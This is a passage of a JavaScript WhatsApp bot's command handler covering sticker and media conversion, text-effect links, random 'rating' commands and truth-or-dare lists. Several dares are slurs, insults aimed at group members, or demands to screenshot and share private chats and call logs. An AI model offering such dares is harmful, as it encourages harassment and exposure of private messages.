replygcGhost("Error!")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Lucy.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Lucy.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcGhost('Reply to Sticker')
                if (!/webp/.test(mime)) return replygcGhost(`reply sticker with caption *${prefix + command}*`)
                GhostStickWait()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await Lucy.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Lucy.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcGhost(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcGhost(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            GhostStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Lucy.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcGhost(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcGhost(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return replygcGhost(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            GhostStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Lucy.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Lucy.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcGhost(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcGhost(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            GhostStickWait()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Lucy.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcGhost('Reply video')
                if (!/webp/.test(mime)) return replygcGhost(`reply sticker with caption *${prefix + command}*`)
                GhostStickWait()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await Lucy.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Lucy.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcGhost(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Lucy.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Ghost through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const Ghostdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Lucy.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Ghostdare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Ghost?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const Ghosttruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Lucy.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Ghosttruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
Lucy.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	GhostStickWait()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replygcGhost(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Lucy.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Lucy.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replygcGhost(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcGhost(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Lucy.downloadAndSaveMediaMessage(quoted, "gifee")
Lucy.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Lucy.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcGhost('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Lucy.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcGhost(`Photo/Video?`)
}
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcGhost(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await Lucy.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await Lucy.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      Lucy.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcGhost('Error')
    }
    }
    break
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcGhost(`Envie/responda imagens/vídeos/gifs com legendas ${prefix+command}\nDuração do vídeo 30 segundos`)
GhostStickerEspere()
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Lucy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 30) return replygcGhost(`Envie/responda imagens/vídeos/gifs com legendas ${prefix+command}\n Duração do vídeo 30 segundos`)
let media = await quoted.download()
let encmedia = await Lucy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replygcGhost(`Envie/responda imagens/vídeos/gifs com legendas ${prefix+command}\n Duração do vídeo 30 segundos`)
}
}
break
case 'quotes':
const quoteGhosty = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteGhosty.data.quote.body}\n\n*${themeemoji} Author:* ${quoteGhosty.data.quote.author}`
return replygcGhost(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcGhost(`Tag Someone, Example : ${prefix + command} @Ghost`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Lucy.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcGhost(`Tag Someone, Example : ${prefix + command} @Ghost`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Lucy.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcGhost(`Tag Someone, Example : ${prefix + command} @Ghost`)
					const Ghosty =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Ghosty[Math.floor(Math.random() * Ghosty.length)]
					Lucy.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return GhostStickGroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Lucy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
Lucy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
Lucy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcGhost(`Example ${prefix+command} const Ghostbot = require('baileys')`)
let meg = await obfus(q)
replygcGhost(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcGhost('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcGhost(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {

if (!q) return replygcGhost(`Example : ${prefix+command} Lucy`) 
GhostStickWait()
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
